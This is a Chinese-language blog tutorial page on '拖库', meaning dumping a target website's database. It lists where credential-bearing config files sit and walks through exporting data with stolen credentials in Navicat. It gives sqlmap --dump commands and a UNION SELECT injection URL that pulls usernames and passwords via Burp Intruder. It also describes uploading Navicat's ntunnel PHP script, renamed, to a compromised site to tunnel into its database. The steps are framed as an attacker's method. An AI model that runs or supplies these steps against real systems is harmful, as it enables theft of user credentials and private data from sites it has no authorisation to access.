@@ -1,0 +1,360 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>拖库 | txjg blog</title>
+  <meta name="author" content="txjg">
+  
+  <meta name="description" content="拖库拖库定义拖库指数据库中数据的导出操作
+拖库方法数据库支持外连接(允许客户端网络连接数据库)常见的数据库配置文件ASP.NETweb.config等
+PHPinc,db,fun等目录下的config.php,conn.php,web.php等
+JSPproperties文件(.properties">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="拖库"/>
+  <meta property="og:site_name" content="txjg blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="txjg blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/">txjg blog</a><span class="split"></span><span class="title">拖库</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2022-04-02</span></h1>
+</div>		
+
+<div class="row page">
+  <!-- cols -->	
+  
+  <div class="col-xs-12 col-sm-3 col-md-3 toc"> 
+	<!-- toc -->
+<script type="text/javascript">
+		jQuery(document).ready(function() {
+ 		   generateWikiTOC('.note', '.toc',  2 , 2 );
+		});
+</script>
+  </div><!-- col-md-3 -->
+  
+  
+
+  
+  <div class="col-xs-12 col-sm-9 col-md-9 note">
+	
+
+	  <!-- content -->
+	  <h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="拖库定义"><a href="#拖库定义" class="headerlink" title="拖库定义"></a>拖库定义</h2><p>拖库指数据库中数据的导出操作</p>
+<h2 id="拖库方法"><a href="#拖库方法" class="headerlink" title="拖库方法"></a>拖库方法</h2><h3 id="数据库支持外连接-允许客户端网络连接数据库"><a href="#数据库支持外连接-允许客户端网络连接数据库" class="headerlink" title="数据库支持外连接(允许客户端网络连接数据库)"></a>数据库支持外连接(允许客户端网络连接数据库)</h3><h4 id="常见的数据库配置文件"><a href="#常见的数据库配置文件" class="headerlink" title="常见的数据库配置文件"></a>常见的数据库配置文件</h4><h5 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h5><p>web.config等</p>
+<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p>inc,db,fun等目录下的config.php,conn.php,web.php等</p>
+<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p>properties文件(.properties)与xml文件(.xml)<br>一般保存在WEB-INF文件夹中</p>
+<h4 id="Navicat导出数据-Navicat-premium支持多个主流数据库"><a href="#Navicat导出数据-Navicat-premium支持多个主流数据库" class="headerlink" title="Navicat导出数据(Navicat premium支持多个主流数据库)"></a>Navicat导出数据(Navicat premium支持多个主流数据库)</h4><p>前提:攻击者已经得到了服务器的数据库的账号密码，并且数据库支持外连接<br>打开navicat</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A41.png" class="">
+<p>点击连接按钮，选择sql server数据库</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A42.png" class="">
+<p>在常规选项卡中输入基本信息(连接名随意),其他选项卡自定义</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A43.png" class="">
+<p>点击确定，navicat主界面就会出现连接名的连接</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A44.png" class="">
+<p>点击该连接，就可以查看此用户权限范围内的数据库信息</p>
+<h5 id="navicat导出表结构及数据-复制整张表"><a href="#navicat导出表结构及数据-复制整张表" class="headerlink" title="navicat导出表结构及数据(复制整张表)"></a>navicat导出表结构及数据(复制整张表)</h5><p>选择要导出的表，点击鼠标右键</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A45.png" class="">
+<p>点击转储SQL文件–&gt;结构和数据</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A46.png" class="">
+<p>选择要保存的位置，点击保存即可</p>
+<h5 id="navicat导出表数据-只导出表数据，不导出表结构"><a href="#navicat导出表数据-只导出表数据，不导出表结构" class="headerlink" title="navicat导出表数据(只导出表数据，不导出表结构)"></a>navicat导出表数据(只导出表数据，不导出表结构)</h5><p>选择要导出的表，点击鼠标右键</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A47.png" class="">
+<p>点击导出向导</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A48.png" class="">
+<p>选择要导出的格式，点击下一步</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A49.png" class="">
+<p>设置导出的路径，点击下一步</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A410.png" class="">
+<p>设置要导出的列，点击下一步</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A411.png" class="">
+<p>自定义选项内容，然后点击下一步</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A412.png" class="">
+<p>点击开始按钮即可导出表中的数据</p>
+<h3 id="数据库不支持外连接-只允许本地操作数据库"><a href="#数据库不支持外连接-只允许本地操作数据库" class="headerlink" title="数据库不支持外连接(只允许本地操作数据库)"></a>数据库不支持外连接(只允许本地操作数据库)</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>前提:网站存在SQL注入漏洞，并可以利用</p>
+<h5 id="Sqlmap导出数据"><a href="#Sqlmap导出数据" class="headerlink" title="Sqlmap导出数据"></a>Sqlmap导出数据</h5><pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; -C &quot;id,username,password&quot; --dump --csv-del&#x3D;&quot;|&quot; --output-dir&#x3D;&quot;c:\out&quot; --dump-format&#x3D;CSV --threads 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>与导出数据有关的选项<br><code>--csv-del</code> 导出CSV格式时，列与列之间的分隔字符。默认为”,”<br><code>--output-dir</code> 导出的目录<br><code>--dump-format</code> 导出的格式。默认为CSV格式<br>注:导出的文件保存在<code>导出目录/网站/dump/数据库</code>目录下，例：c:\out\<a target="_blank" rel="noopener" href="http://www.example.com/dump/user%E4%B8%8B">www.example.com\dump\user下</a></p>
+<h5 id="Burp导出数据"><a href="#Burp导出数据" class="headerlink" title="Burp导出数据"></a>Burp导出数据</h5><ul>
+<li><p>确定表结构</p>
+<ul>
+<li>确认数据库  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>确认表  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>确认列  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li><p>确定表中数据的总数</p>
+<pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; -T &quot;users&quot; --count<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>构造导出的SQL语句<br>导出数据时,一般都以ID为导出标准,因为在一个数据表中,一般会有<code>[*id]</code>作为表的唯一列标识(主键),因为这是数据库的三大范式之一,开发者、DBA都会遮循这个标准</p>
+<ul>
+<li>确定最后的主键ID数  <pre class="line-numbers language-command" data-language="command"><code class="language-command">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;1&quot; -D &quot;user&quot; --sql-query&#x3D;&quot;select uid from users order by uid desc limit 0,1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  注:<code>desc</code>为降序，<code>desc limit 0,1</code>为最后一条<br>  将查询的结果(表中最后一个uid的值)与之前表中数据的总数作对比：如果表中数据的总数小于最后一个uid的值，就代表管理员可能删除了某些记录</li>
+<li>构造导出的SQL语句  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span>uid<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li><p>使用burp intruder模块导出数据<br>将构造的SQL语句的URL加载到burp intruder模块,并将uid的值设为变量</p>
+<pre class="line-numbers language-command" data-language="command"><code class="language-command">http:&#x2F;&#x2F;www.example.com&#x2F;1.php?id&#x3D;-1 union all select null,null,concat(0x7c,uid,0x7e,username,0x5e,password) from users where uid&#x3D;100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A413.png" class="">
+<p>设置payloads</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A414.png" class="">
+<p>设置options,选择Grep-Extract</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A415.png" class="">
+<p>点击add</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A416.png" class="">
+<p>在弹出的界面点击Fetch response，勾选正则匹配，在response中选取要抓取的内容，burp会根据选取的内容自动生成正则表达式</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A417.png" class="">
+<p>点击ok</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A418.png" class="">
+<p>如果需要抓取多个内容，重复以上步骤即可，下图即为抓取多个内容的正则表达式</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A419.png" class="">
+<p>选择Intruder–&gt; Start attack 开始导出抓取数据</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/%E8%84%B1%E8%A3%A420.png" class="">
+<p>导出完毕后就可以点击save–&gt; Results table进行保存<br>注：这种方法导出的数据中可能会有空白行，因为有些数据可能被管理员删除了。<br>可以使用SQL的分页技术解决空白行的问题：<br>MYSQL</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">limit</span> I<span class="token punctuation">,</span>N<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>SQL SERVER</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> I<span class="token operator">+</span>N <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span> a <span class="token keyword">where</span> id <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> I id <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ORACLE</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> t2<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>t1<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> t1 <span class="token keyword">where</span> rownum <span class="token operator">&lt;</span> N<span class="token punctuation">)</span> t2 <span class="token keyword">where</span> t2<span class="token punctuation">.</span>r <span class="token operator">></span> I<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>POSTGRESQL</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">limit</span> I <span class="token keyword">offset</span> N<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>注:除了burp,其他可以导出数据的软件:火车头，八爪鱼</p>
+</li>
+</ul>
+<h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><p>越权访问可以把当前表中某些列(页面显示数据的列)的数据全部遍历出来</p>
+<h4 id="本地导出"><a href="#本地导出" class="headerlink" title="本地导出"></a>本地导出</h4><p>本地导出是指已经有网站的权限，攻击者向web服务器上传类似于“phpmyadmin”的在线数据库管理的“拖库脚本“。这类脚本非常小巧，是专门针对数据导出而写的脚本</p>
+<h5 id="navicat-HTTP通道连接"><a href="#navicat-HTTP通道连接" class="headerlink" title="navicat HTTP通道连接"></a>navicat HTTP通道连接</h5><p>在navicat安装目录下有三个php文件，分别是	<code>ntunnel_mysql.php</code>，<code>ntunnel_pgsql.php</code>,<code>ntunnel_sqlite.php</code>,分别支持对mysql,postgresql,sqlite数据库使用HTTP通道连接</p>
+<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%931.png" class="">
+<ul>
+<li>使用方法<br>(假设目标是PHP+MYSQL）<br>将<code>ntunnel_mysql.php</code>上传到目标网站的根目录下(可以改名如:db.php)<br>打开navicat,点击连接–&gt;MySQL<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%932.png" class="">
+点击HTTP选项卡<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%933.png" class="">
+勾选<code>使用HTTP通道</code>,通道网址框中输入<code>ntunnel_mysql.php</code>的URL,其他默认即可<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%934.png" class="">
+然后返回常规选项卡，填写连接名，用户名，密码，主机名必须为127.0.0.1或localhost(代表本地连接)<img src="/2022/04/02/%E6%8B%96%E5%BA%93/http%E9%80%9A%E9%81%935.png" class="">
+填写完后，即可远程连接MYSQL数据库</li>
+</ul>
+	  
+
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+			
+			
+		
+	
+		
+			
+			
+			
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+	
+	
+		<li class="prev"><a href="/2022/04/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next"><a href="/2022/04/01/MD5%E8%A7%A3%E5%AF%86/" class="alignright next">next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
+</div>
+
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2022 txjg
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.tableofcontents.min.js"></script>
+<script src="/js/tocgenerator.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+
+</body>
+</html>
